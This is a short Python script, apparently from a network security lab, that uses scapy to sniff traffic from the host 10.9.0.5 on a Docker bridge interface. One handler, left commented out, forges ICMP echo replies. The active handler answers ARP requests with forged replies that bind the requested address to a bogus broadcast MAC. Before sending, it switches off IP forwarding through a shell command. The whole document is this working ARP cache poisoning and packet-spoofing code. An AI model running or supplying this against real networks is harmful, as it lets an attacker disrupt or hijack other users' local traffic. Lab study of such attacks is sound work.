#!/usr/bin/env python3
from scapy.all import *
import os

def print_pkt(pkt):
	pkt.show()
	
def disable_ip_forwarding():
    print("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def superspoofer(pkt):
	print(pkt[IP].dst)
	if pkt[ICMP].type != 8:
		return
	a = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
	b = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
	data = pkt[Raw].load
	spoofed = a/b/data
	send(spoofed, verbose=0)
	print_pkt(spoofed)
	
def arpspoofer(pkt):
	spoofed = ARP(op=2,
		pdst=pkt[ARP].psrc,
		hwdst=pkt[ARP].hwsrc,
		psrc=pkt[ARP].pdst,
		hwsrc='ff:ff:ff:ff:ff:ff')
	disable_ip_forwarding()
	send(spoofed, verbose=0)
	print_pkt(spoofed)

#pkt = sniff(iface='br-85762f607e7f', filter='icmp and src host 10.9.0.5', prn=superspoofer)

pkt = sniff(iface='br-85762f607e7f', filter='arp and src host 10.9.0.5', prn=arpspoofer)




